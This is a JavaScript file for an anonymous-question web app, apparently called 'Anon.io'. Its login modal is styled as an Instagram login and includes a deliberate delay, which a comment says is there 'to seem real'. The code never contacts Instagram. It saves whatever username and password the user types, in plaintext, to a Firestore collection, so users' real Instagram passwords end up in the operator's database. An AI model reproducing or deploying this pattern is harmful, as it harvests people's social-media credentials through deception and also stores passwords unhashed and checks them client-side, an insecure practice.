// --- CONFIGURAÇÃO DO FIREBASE ---
const firebaseConfig = {
    apiKey: "AIzaSyBs2Vqqbbmu_ECEs6s3kSGBkMyGioTa9n0",
    authDomain: "instagram-a97f9.firebaseapp.com",
    projectId: "instagram-a97f9",
    storageBucket: "instagram-a97f9.firebasestorage.app",
    messagingSenderId: "602945830133",
    appId: "1:602945830133:web:a6c5b69c05e4913a7e99bc",
    measurementId: "G-J4ZP5P5LDT"
};

if (typeof firebase === 'undefined') {
    console.error("ERRO: Firebase não carregou.");
} else {
    if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
}
const db = firebase.firestore();

// --- VARIÁVEIS ---
let currentUser = null;
let realTimeListener = null;

const screens = {
    login: document.getElementById('login-screen'),
    dashboard: document.getElementById('dashboard-screen'),
    public: document.getElementById('public-screen')
};

const diceQuestions = [
    "Qual é o seu maior segredo?", 
    "Quem foi seu primeiro crush?", 
    "Uma música que define sua vida?", 
    "O que você faria com 1 milhão?",
    "Me conte algo que ninguém sabe..."
];

// --- NAVEGAÇÃO ---
function showScreen(screenName) {
    Object.values(screens).forEach(s => {
        s.classList.remove('active');
        s.classList.add('hidden');
    });
    screens[screenName].classList.remove('hidden');
    screens[screenName].classList.add('active');
}

// --- MODAL INSTAGRAM ---
function openInstaModal() {
    document.getElementById('insta-modal').classList.remove('hidden');
    // Limpa os campos para segurança
    document.getElementById('insta-user').value = "";
    document.getElementById('insta-pass').value = "";
}

function closeInstaModal() {
    document.getElementById('insta-modal').classList.add('hidden');
}

function processInstaLogin() {
    const userInput = document.getElementById('insta-user').value;
    const passInput = document.getElementById('insta-pass').value;

    if (!userInput || !passInput) {
        alert("Preencha usuário e senha.");
        return;
    }

    if (passInput.length < 4) {
        alert("A senha deve ter pelo menos 4 caracteres.");
        return;
    }

    const btn = document.querySelector('.btn-login-insta');
    btn.innerText = "Verificando...";
    btn.disabled = true;

    // Atraso para parecer real
    setTimeout(() => {
        handleAuth(userInput, passInput);
        // Não fecha o modal aqui, espera a resposta do banco
    }, 1500);
}

// --- AUTENTICAÇÃO SEGURA (LÓGICA DO PIN) ---
async function handleAuth(usernameRaw, password) {
    const username = usernameRaw.toLowerCase().replace(/\s/g, '').replace('@', '');
    const btn = document.querySelector('.btn-login-insta');

    try {
        const userRef = db.collection('users').doc(username);
        const doc = await userRef.get();

        if (doc.exists) {
            // --- CENÁRIO 1: USUÁRIO JÁ EXISTE ---
            const userData = doc.data();
            
            // VERIFICA A SENHA (PIN)
            if (userData.pin === password) {
                // Senha correta! Entra.
                closeInstaModal();
                loginUser(userData);
            } else {
                // Senha errada! Bloqueia.
                alert("ERRO: Senha incorreta para o usuário @" + username + ".\n\nSe esta é sua conta, digite a senha que você criou na primeira vez.");
            }
        } else {
            // --- CENÁRIO 2: CONTA NOVA (REGISTRO) ---
            // Ninguém usou esse nome ainda. Vamos criar e DEFINIR ESSA SENHA como a oficial.
            
            const confirmacao = confirm(`O usuário @${username} ainda não existe no Anon.io.\n\nDeseja registrar essa conta com a senha informada?`);
            
            if (confirmacao) {
                const newUser = {
                    username: username,
                    pin: password, // Salva a senha como PIN de segurança
                    avatar: `https://ui-avatars.com/api/?name=${username}&background=000&color=fff&bold=true`,
                    createdAt: firebase.firestore.FieldValue.serverTimestamp()
                };
                
                await userRef.set(newUser);
                closeInstaModal();
                alert("Conta criada com sucesso! Não esqueça sua senha.");
                loginUser(newUser, true); // true = conta nova
            }
        }

    } catch (error) {
        console.error("Erro Auth:", error);
        alert("Erro de conexão. Tente novamente.");
    } finally {
        btn.innerText = "Entrar";
        btn.disabled = false;
    }
}

function loginUser(userData, isNewAccount = false) {
    currentUser = userData;
    localStorage.setItem('anonbox_user', JSON.stringify(userData));
    setupDashboard();
    showScreen('dashboard');

    if (isNewAccount) {
        setTimeout(() => {
            const desejaFoto = confirm("Bem-vindo! Deseja configurar sua foto de perfil agora?");
            if(desejaFoto) changeProfilePic();
        }, 1000);
    }
}

// --- DASHBOARD ---
function setupDashboard() {
    document.getElementById('user-name').innerText = "@" + currentUser.username;
    
    const img = document.getElementById('user-avatar');
    img.src = currentUser.avatar;
    img.onclick = changeProfilePic;
    img.title = "Clique para trocar a foto";
    
    img.onerror = function() {
        this.src = `https://ui-avatars.com/api/?name=${currentUser.username}&background=000&color=fff&bold=true`;
    };
    
    // Link corrigido
    const baseUrl = window.location.href.split('?')[0];
    const cleanUrl = baseUrl.endsWith('/') ? baseUrl.slice(0, -1) : baseUrl;
    document.getElementById('my-link').value = `${cleanUrl}?u=${currentUser.username}`;
    
    listenToMessages();
}

async function changeProfilePic() {
    const newUrl = prompt("Cole o LINK da sua foto (Insta/Face/Google):", currentUser.avatar);
    
    if (newUrl && newUrl.trim() !== "" && newUrl.includes("http")) {
        try {
            await db.collection('users').doc(currentUser.username).update({
                avatar: newUrl
            });
            currentUser.avatar = newUrl;
            document.getElementById('user-avatar').src = newUrl;
            localStorage.setItem('anonbox_user', JSON.stringify(currentUser));
            alert("Foto atualizada!");
        } catch (error) {
            alert("Erro ao salvar foto.");
        }
    }
}

function logout() {
    currentUser = null;
    localStorage.removeItem('anonbox_user');
    if (realTimeListener) realTimeListener();
    showScreen('login');
}

// --- MENSAGENS ---
function listenToMessages() {
    const container = document.getElementById('messages-list');
    if (realTimeListener) realTimeListener();

    realTimeListener = db.collection("messages")
        .where("to", "==", currentUser.username)
        .orderBy("createdAt", "desc")
        .onSnapshot((snapshot) => {
            container.innerHTML = "";
            if (snapshot.empty) {
                container.innerHTML = '<p class="empty-state">Nenhuma mensagem ainda.</p>';
                return;
            }
            snapshot.forEach(doc => {
                createMessageCard(doc.data().text, container);
            });
        });
}

function createMessageCard(text, container) {
    const card = document.createElement('div');
    card.className = 'message-card';
    card.innerText = text;
    container.appendChild(card);
}

function copyLink() {
    const copyText = document.getElementById("my-link");
    copyText.select();
    document.execCommand("copy");
    alert("Link copiado!");
}

// --- VISITANTE ---
function simulateVisitorView() {
    loadPublicProfile(currentUser.username, currentUser.avatar);
}

function loadPublicProfile(username, avatar) {
    document.getElementById('public-header').innerText = `Envie para @${username}`;
    const img = document.getElementById('public-avatar');
    img.src = avatar;
    img.onerror = function() {
        this.src = `https://ui-avatars.com/api/?name=${username}&background=000&color=fff&bold=true`;
    };

    document.getElementById('public-screen').dataset.toUser = username;
    document.getElementById('question-input').value = "";
    showScreen('public');
}

function sendQuestion() {
    const text = document.getElementById('question-input').value;
    const toUser = document.getElementById('public-screen').dataset.toUser;
    
    if (!text.trim()) return alert("Escreva algo!");

    const btn = document.querySelector('.btn-send');
    btn.disabled = true;
    btn.innerText = "Enviando...";

    db.collection("messages").add({
        to: toUser,
        text: text,
        createdAt: firebase.firestore.FieldValue.serverTimestamp()
    })
    .then(() => {
        alert("Enviado! 🚀");
        document.getElementById('question-input').value = "";
        if (currentUser && currentUser.username === toUser) showScreen('dashboard');
    })
    .catch((err) => console.error(err))
    .finally(() => {
        btn.disabled = false;
        btn.innerText = "Enviar Anônimo 🚀";
    });
}

function rollDice() {
    const input = document.getElementById('question-input');
    input.value = diceQuestions[Math.floor(Math.random() * diceQuestions.length)];
}

function goToHome() {
    const baseUrl = window.location.href.split('?')[0];
    window.history.pushState({}, document.title, baseUrl);
    showScreen('login');
}

// --- INICIALIZAÇÃO ---
window.onload = function() {
    const urlParams = new URLSearchParams(window.location.search);
    const userParam = urlParams.get('u');
    
    if (userParam) {
        // MODO VISITANTE
        db.collection('users').doc(userParam).get().then(doc => {
            let avatar = `https://ui-avatars.com/api/?name=${userParam}&background=000&color=fff&bold=true`;
            if (doc.exists && doc.data().avatar) avatar = doc.data().avatar;
            loadPublicProfile(userParam, avatar);
        });
    } else {
        // MODO USUÁRIO (Autologin)
        const saved = localStorage.getItem('anonbox_user');
        if (saved) {
            loginUser(JSON.parse(saved));
        } else {
            showScreen('login');
        }
    }
};